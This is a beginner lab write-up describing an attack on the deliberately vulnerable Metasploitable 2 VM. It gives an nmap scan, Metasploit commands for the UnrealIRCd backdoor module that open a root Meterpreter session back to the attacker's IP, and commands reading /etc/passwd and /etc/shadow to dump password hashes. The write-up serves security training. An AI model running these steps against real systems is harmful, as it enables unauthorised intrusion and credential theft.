Lab 01 – Metasploitable 2 Exploitation & Post-Exploitation

Date: July 2026 · Difficulty: Beginner–Intermediate · Status: Completed

Objective

Perform a complete offensive attack chain against Metasploitable 2: from environment setup and reconnaissance to successful exploitation and post-exploitation, obtaining a root-level Meterpreter session.

Environment

  • Attacker: Kali Linux 2026.2
  • Target: Metasploitable 2
  • Network: Bridged Adapter (same network)
  • Attacker IP: 192.168.1.159
  • Target IP: 192.168.1.160

Methodology

  1. Lab environment setup and network configuration
  2. Service and version detection with Nmap
  3. Vulnerability identification (UnrealIRCd 3.2.8.1)
  4. Exploitation using Metasploit
  5. Post-exploitation and verification

Walkthrough

1. Reconnaissance

Performed a service and version scan against the target:

nmap -sV -sC 192.168.1.160

Identified UnrealIRCd running on port 6667, a service known to contain a backdoor in this version.

2. Exploitation

Launched Metasploit and selected the appropriate module:

msfconsole
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.160
set LHOST 192.168.1.159
run

Successfully obtained a Meterpreter session as root.

3. Post-Exploitation

Verified access and gathered system information:

getuid
sysinfo
shell
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow

Confirmed root access and successfully dumped password hashes.

Results

  • Root Meterpreter session obtained
  • Full system enumeration performed
  • Password hashes extracted from /etc/shadow
  • Complete attack chain documented

Tools Used

Oracle VirtualBox · Kali Linux · Metasploitable 2 · Nmap · Metasploit Framework

Lessons Learned

This lab reinforced the importance of proper network configuration, accurate version detection, and the value of post-exploitation once a foothold is gained. Even older vulnerabilities remain excellent for learning structured offensive methodology.
